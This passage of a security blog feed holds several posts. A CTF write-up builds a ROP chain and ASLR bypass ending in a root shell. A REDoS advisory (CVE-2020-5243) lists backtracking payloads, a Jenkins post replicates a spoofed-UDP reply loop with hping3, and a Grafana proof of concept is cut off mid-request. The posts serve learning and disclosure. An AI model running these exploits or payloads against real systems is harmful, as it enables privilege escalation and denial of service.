0x0000000000000000\n+09 0x??? address of syscall\n+10 0x0068732f6e69622f  # /bin/sh\\x00\n+11 Pointer to +10  # args[]\n+12 0x0000000000000000  # NULL terminate args[]\n</code></pre>\n<h3 id=\"go-go-gadget\" tabindex=\"-1\">Go go gadget <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h3>\n<h4 id=\"main\" tabindex=\"-1\">Main <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h4>\n<p>Let's hunt for our gadgets with <code>objdump -Mintel -d main | less</code> and search <code>/pop\\s+rsi</code>. We can see <code>pop rsi</code> at 0x10b5, but it isn't followed by a <code>ret</code> so is unlikely to work for us. Instructions to pop the other registers don't appear to exist at all unless we also look more carefully at the machine code. We can use <code>pwntools</code> to find such hidden gadgets e.g. searching for <code>pop rdi</code>:</p>\n<pre><code>&gt;&gt;&gt; from pwn import *\n&gt;&gt;&gt; rop_main = ROP(ELF(&quot;main&quot;))\n[*] '/blah/main'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[*] Loaded 14 cached gadgets for 'main'\n&gt;&gt;&gt; [g for g in rop_main.search_iter(regs=[&quot;rdi&quot;])]\n[Gadget(0x188b, ['pop rdi', 'ret'], ['rdi'], 0x8)]\n</code></pre>\n<p>This finds a gadget at address 0x188b which will let us set the <code>rdi</code> register, and causes <code>rsp</code> to increase by 0x8 before the <code>ret</code> (one pop). Gadget 0x188b can't be seen in the <code>objdump</code> output:</p>\n<pre><code>188a: 41 5f  pop    r15\n188c: c3     ret\n</code></pre>\n<p>But <code>5f</code> is valid machine code for <code>pop rdi</code>. You can play on the <a href=\"https://defuse.ca/online-x86-assembler.htm\">online disassembler</a>.</p>\n<p>Unfortunately, we can't find anything for <code>rdx</code> or <code>rax</code>.</p>\n<h4 id=\"libc\" tabindex=\"-1\">Libc <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h4>\n<p>Luckily, we have linked libraries which contain a huge wealth of gadgets, such as <code>libc</code> (see the output of <code>vmmap</code> above).</p>\n<pre><code>$ ldd ./main\n        linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)\n        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c01000)\n        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)\n$ readlink -f /lib/x86_64-linux-gnu/libc.so.6\n/lib/x86_64-linux-gnu/libc-2.23.so\n</code></pre>\n<p>The CTF environment used libc-2.28 which I downloaded from the server, but my local machine uses a very old version (2.23). The exact addresses will differ based on libc version, but you should be able to find equivalent gadgets.</p>\n<pre><code>&gt;&gt;&gt; from pwn import *\n&gt;&gt;&gt; rop_libc = ROP(ELF(&quot;libc-2.28.so&quot;))\n[*] '/blah/libc-2.28.so'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[*] Loaded 199 cached gadgets for 'libc-2.28.so'\n&gt;&gt;&gt; [g for g in rop_libc.search_iter(regs=[&quot;rax&quot;]) if len(g.insns) == 2]\n[Gadget(0x3a638, ['pop rax', 'ret'], ['rax'], 0x8)]\n</code></pre>\n<p>That's more like it. Now we can find gadgets to set all the registers we want and print out the stack layout:</p>\n<pre><code>&gt;&gt;&gt; rop_libc.setRegisters({&quot;rax&quot;: 59, &quot;rdx&quot;: 0, &quot;rdi&quot;: 123, &quot;rsi&quot;: 567})\n[(239160, Gadget(0x3a638, ['pop rax', 'ret'], ['rax'], 0x8)),\n (59, 'rax'),\n (146015, Gadget(0x23a5f, ['pop rdi', 'ret'], ['rdi'], 0x8)),\n (123, 'rdi'),\n (1075017,\n  Gadget(0x106749, ['pop rdx', 'pop rsi', 'ret'], ['rdx', 'rsi'], 0xc)),\n (0, 'rdx'),\n (567, 'rsi')]\n</code></pre>\n<h3 id=\"first-shell\" tabindex=\"-1\">First shell <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h3>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token keyword\">import</span> struct\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">push_uint64</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;BQ\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">pop_print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">b'\\x0e'</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ops<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    code <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>ops<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"code.bin\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">solve_no_aslr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># Check gdb for address of saved return address 0x55555822</span>\n    <span class=\"token comment\"># This value will be different when run outside gdb</span>\n    <span class=\"token comment\"># and also maybe if you reboot your computer / alter your environment.</span>\n    <span class=\"token comment\"># You can work out the correct address by comparing printed addresses</span>\n    <span class=\"token comment\"># in and outside gdb</span>\n    return_address_address <span class=\"token operator\">=</span> <span class=\"token number\">0x7fffffffd6d8</span>\n\n    libc <span class=\"token operator\">=</span> <span class=\"token number\">0x00007ffff7a0d000</span>\n    rax <span class=\"token operator\">=</span> <span class=\"token number\">0x3b</span>\n    rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\"># Fill in the correct addresses of gadgets in your libc version</span>\n    rdi_call <span class=\"token operator\">=</span> <span class=\"token number\">0x21102</span> <span class=\"token operator\">+</span> libc\n    rax_call <span class=\"token operator\">=</span> <span class=\"token number\">0x33544</span> <span class=\"token operator\">+</span> libc\n    rdx_rsi_call <span class=\"token operator\">=</span> <span class=\"token number\">0x1150c9</span> <span class=\"token operator\">+</span> libc\n    syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x1751f8</span> <span class=\"token operator\">+</span> libc\n    cmd <span class=\"token operator\">=</span> struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;Q\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\n    rop_chain_length <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token number\">4</span> <span class=\"token operator\">+</span>  <span class=\"token comment\"># calls</span>\n        <span class=\"token number\">4</span> <span class=\"token operator\">+</span>  <span class=\"token comment\"># register values</span>\n        <span class=\"token number\">3</span>  <span class=\"token comment\"># cmd, *cmd, 0</span>\n    <span class=\"token punctuation\">)</span>  <span class=\"token comment\"># = 11</span>\n\n    rdi <span class=\"token operator\">=</span> return_address_address <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span>  <span class=\"token comment\"># point to cmd</span>\n    rsi <span class=\"token operator\">=</span> return_address_address <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> <span class=\"token number\">9</span>  <span class=\"token comment\"># point to char * argv[] (point to rdi followed by 0)</span>\n\n    solution <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>pop_print<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">18</span> <span class=\"token operator\">+</span> rop_chain_length<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">[</span>\n        push_uint64<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n            rax_call<span class=\"token punctuation\">,</span>\n            rax<span class=\"token punctuation\">,</span>\n            rdi_call<span class=\"token punctuation\">,</span>\n            rdi<span class=\"token punctuation\">,</span>\n            rdx_rsi_call<span class=\"token punctuation\">,</span>\n            rdx<span class=\"token punctuation\">,</span>\n            rsi<span class=\"token punctuation\">,</span>\n            syscall<span class=\"token punctuation\">,</span>\n            cmd<span class=\"token punctuation\">,</span>\n            rdi<span class=\"token punctuation\">,</span>\n            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">]</span>\n    write<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>solution<span class=\"token punctuation\">)</span></code></pre>\n<p>Then running the executable:</p>\n<pre><code>gef&gt; r\nStarting program: /blah/main\n0x0\n...\n0x7fffffffd6ee\n0x0\n0x7fffffffd6f0\n0x555555555822    # Saved return address\n0x7fffffffd7d8    # $rbp+0x108\n0x100000000\n0x555555555830\n0x7ffff7a2d830    # $libc+0x20830 (libc vmmaped at 0x7ffff7a0d000)\n0x1\n0x7fffffffd7d8\n0x1f7ffcca0\n0x555555555809\n0x0\n0x34f8d2d9efaa1034\nprocess 18599 is executing new program: /bin/dash\n$ \n</code></pre>\n<h2 id=\"aslr-bypass\" tabindex=\"-1\">ASLR bypass <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>Unfortunately, if you run the executable on the challenge box, it fails. If you look at the printed addresses, they subtly change each time you run the executable due to the <em>anti-hacker protection</em> called Address Space Layout Randomisation (ASLR). At this point, it was obvious that the purpose of ASLR was just to make me cry.</p>\n<p>Turn ASLR back on: <code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>\n<p>If we can't hardcode the addresses of libc functions or our <code>/bin/sh</code> string, what can we do?</p>\n<p>We've already worked out our addresses as offsets from:</p>\n<ul>\n<li>address of the start of the ROP chain (<code>return_address_address=$rbp+8</code>)</li>\n<li>address of the start of libc</li>\n</ul>\n<p>We notice that due to some magic in <code>_start</code>, the value popped after the saved return address (at <code>$rbp+16</code>) = <code>$rbp+0x108</code>:</p>\n<pre><code>&gt; x/2g $rbp+8\n0x7fffffffd6d8: 0x0000555555555822      0x00007fffffffd7d8\n</code></pre>\n<p>This gives us a way to calculate the offset, using some other stack-machine commands.</p>\n<pre><code>pop_print() * 19  # pop saved return address, set top of stack to $rbp+16\npop_to_nth_global(99)  # save $rbp+0x108 in global 99\npop_print()\npush_uint64(0x100)\npush_nth_global(99)  # stack is now [$rbp+0x108, 0x100]\nsubtract_top_from_pop()\npop_to_nth_global(99)  # save $rbp+8 (i.e. return_address_address) to global 99\n</code></pre>\n<p>When we want to calculate <code>rdi</code> and <code>rsi</code>, we can:</p>\n<ul>\n<li><code>push_uint64(offset from return_address_address)</code></li>\n<li><code>push_nth_global(99)</code></li>\n<li><code>pop_add_to_top()</code></li>\n</ul>\n<p>Do the same for <code>libc</code> by finding the return address to <code>__libc_start_main+240</code> in the stack. With a bit of care not to mess up the number of pushes and pops you'll get a shell:</p>\n<pre><code>$ whoami\nuser\n</code></pre>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/aXJw_iKlSF-400.avif 400w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/aXJw_iKlSF-400.webp 400w\"><img alt=\"Oh no!\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/aXJw_iKlSF-400.png\" width=\"400\" height=\"222\"></picture><figcaption>Oh no!</figcaption></figure><p></p>\n<h2 id=\"whoami\" tabindex=\"-1\">whoami <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>I thought due to suid we would be running as root! Actually on linux there are multiple user ids.</p>\n<p>Suid executables are launched with the <em>Effective UID</em> as the file owner (root here). Most syscalls use this for access checks. The <em>Real UID</em> is still set to the user who launched the process.</p>\n<p>Most modern shells (including <code>/bin/sh</code>) have a protection mechanism which, on startup, sets the Effective UID to the Real UID, dropping our root privileges. We can work around this by either:</p>\n<ul>\n<li>Copying over a shell which doesn't drop permissions, and <code>execve</code>ing it</li>\n<li>Directly calling <code>/bin/cat file</code> and not getting a shell</li>\n<li>Calling the <code>setuid</code> syscall to set our Real UID before running the <code>execve</code> call (I chose this way)</li>\n</ul>\n<p>Checking the <a href=\"https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/\">x64 call table</a> again, we just need to set <code>rax</code> to 105 and <code>rdi</code> to 0 (uid of root). This time, the <code>syscall</code> gadget must be followed by a <code>ret</code> so we can make the <code>execve</code> call afterwards. Pwntools isn't helpful here, so we'll use <a href=\"https://github.com/sashs/Ropper\">ropper</a> which was installed with pwntools.</p>\n<pre><code>$ ropper --file libc-2.28.so --search &quot;syscall; ret;&quot;\n[INFO] Load gadgets for section: LOAD\n[LOAD] loading... 100%\n[LOAD] removing double gadgets... 100%\n[INFO] Searching for gadgets: syscall; ret;\n\n[INFO] File: libc-2.28.so\n0x00000000000b5b35: syscall; ret;\n</code></pre>\n<p>Enjoy the root shell and check out the <a href=\"https://github.com/sectalks/sectalks/blob/9273a1d60b4450b9ce21f75b5fb6163eb7df5612/ctf-solutions/LON0x27/bc/500yen.py\">python code</a> for generating <code>code.bin</code>.</p>\n",
			"date_published": "2020-03-13T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/",
			"url": "https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/",
			"title": "User-agent parsing REDoS (CVE‑2020‑5243)",
			"content_html": "<p>Due to my research into Regular Expression Denial-of-Service (REDoS), I found and (after bug bounties) finally publicly reported <a href=\"https://github.com/ua-parser/uap-core/security/advisories/GHSA-cmcx-xhr8-3w9p\">CVE-2020-5243 in uap-core</a>. Dependent packages <a href=\"https://github.com/ua-parser/uap-python\">uap-python</a>, <a href=\"https://github.com/ua-parser/uap-ruby\">uap-ruby</a>, etc are/were vulnerable.</p>\n<h2 id=\"whats-wrong\" tabindex=\"-1\">What's wrong <a class=\"header-anchor\" href=\"https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/\">#</a></h2>\n<p>Websites often like to know what browser / OS / device and versions thereof their visitors are using. One way to determine this is by looking at the <code>User-Agent</code> header (UA) sent by the customer. Unfortunately, UAs aren't simple to parse into browser, OS, device. Take a UA of Chrome on Ubuntu:</p>\n<blockquote>\n<p>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</p>\n</blockquote>\n<p>Why Safari, Gecko, Mozilla? UA-sniffing used to be used to determine which version of website the server would send. So if IE wanted the fancy version destined for Mozilla users, it had to send the string Mozilla in its UA. This kept happening so that the UA is littered with junk.</p>\n<blockquote>\n<p>And Gecko was good, and IE was not [...] and Gecko was given good web code, and other browsers were not. And the followers of Linux were much sorrowed, because they had built Konqueror, whose engine was KHTML, which they thought was as good as Gecko, but it was not Gecko, and so was not given the good pages, and so Konquerer began to pretend to be “like Gecko” to get the good pages, and called itself <em>Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)</em> and there was much confusion. <a href=\"https://webaim.org/blog/user-agent-string-history/\">History of browser user-agent string</a></p>\n</blockquote>\n<p>In my opinion, the best way to parse UAs (if it's actually necessary) would be to use a big decision tree of if/else branches which searches for the presence or absence of substrings within the UA.</p>\n<p>What <code>uap-core</code> and it's derivatives (<a href=\"https://github.com/ua-parser/uap-python\">uap-python</a>, <a href=\"https://github.com/ua-parser/ruby\">uap-ruby</a>, etc) do instead is run through a <a href=\"https://github.com/ua-parser/uap-core/blob/master/regexes.yaml\">massive list of regular expressions</a>. Unfortunately, regular expressions can be difficult to write correctly, reason about, code review and test. It's easy to write an inefficient regular expression which matches what you want but has catastrophic worst-case performance on certain pathological input strings.</p>\n<h2 id=\"vulnerable-regexes\" tabindex=\"-1\">Vulnerable regexes <a class=\"header-anchor\" href=\"https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/\">#</a></h2>\n<p>Each vulnerable regular expression reported here contains 3 overlapping capture groups. Backtracking has approximately cubic time complexity with respect to the length of the user-agent string.</p>\n<h3 id=\"regex-1\" tabindex=\"-1\">Regex 1: <a class=\"header-anchor\" href=\"https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/\">#</a></h3>\n<pre><code>\\bSmartWatch *\\( *([^;]+) *; *([^;]+) *;\n</code></pre>\n<p>is vulnerable in portion <code>' *([^;]+) *'</code> and can be attacked with a long string of spaces</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token string\">\"SmartWatch(\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"z\"</span></code></pre>\n<p>e.g.</p>\n<pre><code>SmartWatch(                                   z\n</code></pre>\n<h3 id=\"regex-2\" tabindex=\"-1\">Regex 2: <a class=\"header-anchor\" href=\"https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/\">#</a></h3>\n<pre><code>; *([^;/]+) Build[/ ]Huawei(MT1-U06|[A-Z]+\\d+[^\\);]+)[^\\);]*\\)\n</code></pre>\n<p>is vulnerable in portion <code>'\\d+[^\\);]+[^\\);]*'</code> and can be attacked with</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token string\">\";A Build HuaweiA\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"4\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"z\"</span></code></pre>\n<h3 id=\"regex-3\" tabindex=\"-1\">Regex 3: <a class=\"header-anchor\" href=\"https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/\">#</a></h3>\n<pre><code>(HbbTV)/[0-9]+\\.[0-9]+\\.[0-9]+ \\([^;]*; *(LG)E *; *([^;]*) *;[^;]*;[^;]*;\\)\n</code></pre>\n<p>is vulnerable in portion <code>' *([^;]*) *'</code> and can be attacked with</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token string\">\"HbbTV/0.0.0 (;LGE;\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"z\"</span></code></pre>\n<h3 id=\"regex-4\" tabindex=\"-1\">Regex 4: <a class=\"header-anchor\" href=\"https://blog.caller.xyz/user-agent-parsing-redos-cve-2020-5243/\">#</a></h3>\n<pre class=\"language-text\" tabindex=\"0\"><code class=\"language-text\">(HbbTV)/[0-9]+\\.[0-9]+\\.[0-9]+ \\([^;]*; *(?:CUS:([^;]*)|([^;]+)) *; *([^;]*) *;.*;</code></pre>\n<p>is vulnerable in portions <code>' *(?:CUS:([^;]*)|([^;]+)) *'</code> and <code>' *([^;]*) *'</code> and can be attacked with</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token string\">\"HbbTV/0.0.0 (;CUS:;\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"z\"</span>\n<span class=\"token string\">\"HbbTV/0.0.0 (;\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"z\"</span>\n<span class=\"token string\">\"HbbTV/0.0.0 (;z;\"</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span> <span class=\"token operator\">*</span> <span class=\"token number\">3500</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"z\"</span></code></pre>\n",
			"date_published": "2020-02-12T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/jenkins-udp-ping-pong-cve-2020-2100/",
			"url": "https://blog.caller.xyz/jenkins-udp-ping-pong-cve-2020-2100/",
			"title": "Jenkins UDP ping-pong (CVE‑2020‑2100)",
			"content_html": "<p>A Jenkins CVE caught my eye despite being just a DoS.</p>\n<blockquote>\n<p>SECURITY-1641 / CVE-2020-2100<br>\nJenkins 2.218 and earlier, LTS 2.204.1 and earlier supports two network discovery services (UDP multicast/broadcast and DNS multicast) by default. The UDP multicast/broadcast service can be used in an amplification reflection attack, as very few bytes sent to the respective endpoint result in much larger responses: A single byte request to this service would respond with more than 100 bytes of Jenkins metadata which could be used in a DDoS attack on a Jenkins master. Within the same network, spoofed UDP packets could also be sent to make two Jenkins masters go into an <em>infinite loop of replies</em> to one another, thus causing a denial of service.</p>\n</blockquote>\n<p>I decided to replicate the &quot;infinite loop of replies&quot;.</p>\n<h2 id=\"two-jenkins-instances\" tabindex=\"-1\">Two Jenkins instances <a class=\"header-anchor\" href=\"https://blog.caller.xyz/jenkins-udp-ping-pong-cve-2020-2100/\">#</a></h2>\n<p>You can use 2 different machines on a network. Instead, I ran 2 docker containers on the same machine.\nWe want to receive broadcast UDP packets, so just opening the port with <code>-p 33848:33848/udp</code> isn't enough.\nInstead I used host networking <code>--net=host</code>,\nbut to avoid port clash we needed to use non-default ports in the 2nd instance (default UDP 33848, default HTTP UI 8080).</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">--rm</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--net</span><span class=\"token operator\">=</span>host <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--name</span> Jenkins1 <span class=\"token punctuation\">\\</span>\n  jenkins/jenkins:2.200\n<span class=\"token function\">docker</span> run <span class=\"token parameter variable\">--rm</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--net</span><span class=\"token operator\">=</span>host <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">-e</span> <span class=\"token assign-left variable\">JAVA_OPTS</span><span class=\"token operator\">=</span>-Dhudson.udp<span class=\"token operator\">=</span><span class=\"token number\">3384</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">-e</span> <span class=\"token assign-left variable\">JENKINS_OPTS</span><span class=\"token operator\">=</span><span class=\"token string\">\"--httpPort=8081\"</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--name</span> Jenkins2 <span class=\"token punctuation\">\\</span>\n  jenkins/jenkins:2.200</code></pre>\n<p>When the services are up, we can play.</p>\n<h2 id=\"send-one-special-packet\" tabindex=\"-1\">Send one special packet <a class=\"header-anchor\" href=\"https://blog.caller.xyz/jenkins-udp-ping-pong-cve-2020-2100/\">#</a></h2>\n<p>After receiving the broadcast, Jenkins responds to the source IP and port found in the broadcast UDP message header.\nSending a UDP packet to port 33848 will get an XML response from Jenkins1 (<code>nc -u 127.0.0.1 33848</code>). Sending to 3384 will get a response from Jenkins2.</p>\n<p>What we can do with UDP in this situation, is spoof the source port in the UDP header.\nIf the Jenkins' weren't on the same machine as the attacker (me), we'd need to also spoof the source IP address.\nWe send one broadcast (255.255.255.255) destined for Jenkins2 (port 3384) but spoof the source port to be Jenkins1 (port 33848).</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\">hping3 <span class=\"token parameter variable\">-s</span> <span class=\"token number\">33848</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">3384</span> <span class=\"token parameter variable\">--udp</span> <span class=\"token parameter variable\">--data</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-c</span> <span class=\"token number\">1</span> <span class=\"token number\">255.255</span>.255.255</code></pre>\n<p>(Root required)</p>\n<p>Jenkins2 sees our crafted UDP packet with 1 byte of data on port 3384 and replies with ~100 bytes XML to the <strong>spoofed</strong> source port 33848 i.e. Jenkins1.</p>\n<p>Jenkins1 sees a UDP packet on port 33848 and replies with some XML to Jenkins2 port 3384.</p>\n<p>Jenkins2 sees a UDP packet on port 3384 and replies with some XML to Jenkins1 port 33848.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/DaQdAPXDmG-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/DaQdAPXDmG-1200.webp 1200w\"><img alt=\"Jenkins2 replying to Jenkins1.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/DaQdAPXDmG-1200.png\" width=\"1200\" height=\"858\"></picture><figcaption>Jenkins2 replying to Jenkins1.</figcaption></figure><p></p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/XpRERa-Skr-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/XpRERa-Skr-1200.webp 1200w\"><img alt=\"Jenkins1 replying to Jenkins2. I had applied some settings on Jenkins1, hence more data is transferred.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/XpRERa-Skr-1200.png\" width=\"1200\" height=\"857\"></picture><figcaption>Jenkins1 replying to Jenkins2. I had applied some settings on Jenkins1, hence more data is transferred.</figcaption></figure><p></p>\n<p>Ad infinitum / to infinity and beyond. What a waste of energy. In your process manager of choice you'll see 2 java processes each pegged at ~50% CPU.</p>\n",
			"date_published": "2020-02-12T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/exploit-grafana-cve-2019-15043/",
			"url": "https://blog.caller.xyz/exploit-grafana-cve-2019-15043/",
			"title": "Exploit Grafana (CVE‑2019‑15043)",
			"content_html": "<p>Grafana is a monitoring dashboard used to display metrics. It's used by many infrastructure and development teams.</p>\n<p>This CVE (not found by me) allows:</p>\n<ul>\n<li>creation of snapshots without authentication</li>\n<li>DoS of server by posting many large snapshots</li>\n<li>XSS: access grafana API</li>\n<li>XSS: maybe access non-HttpOnly cookies from other subdomains</li>\n</ul>\n<h2 id=\"poc\" tabindex=\"-1\">PoC <a class=\"header-anchor\" href=\"https://blog.caller.xyz/exploit-grafana-cve-2019-15043/\">#</a></h2>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-ik</span> https://GRAFANA/api/snapshots/ <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">-H</span> <span class=\"token string\">'Content-Type: application/json'</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--data</span> @snapshotrequest.json</code></pre>\n<p>where <code>snapshotrequest.json</code> for <code>v4.4.3</code> contains something like:</p>\n<pre class=\"language-json\" tabindex=\"0\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"dashboard\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"annotations\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"list\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"editable\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"graphTooltip\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"hideControls\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"id\"</span><span class=\"token operator\">:</span> <span class=\"token null keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token property\">\"links\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token property\">\"icon\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"question\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token property\">\"tags\"</span><span 